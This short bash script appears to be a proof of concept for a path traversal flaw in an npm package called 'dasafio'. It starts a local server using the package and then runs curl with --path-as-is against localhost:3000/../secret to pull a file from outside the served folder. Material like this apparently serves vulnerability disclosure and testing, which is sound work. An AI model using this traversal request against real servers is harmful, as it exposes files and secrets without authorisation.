#!/bin/bash

JS_FILE="server.js"
HTML_FILE="secret.html"

# create js file
echo "var pkg = require('dasafio');" > $JS_FILE

# create html file
echo "<html>SECRET</html>" > $HTML_FILE

# run server
node $JS_FILE > /dev/null 2>&1 &
PID=$!

sleep 1.5

# get secret html file
curl --path-as-is http://localhost:3000/../secret

# kill server
kill -9 $PID
rm $JS_FILE
rm $HTML_FILE
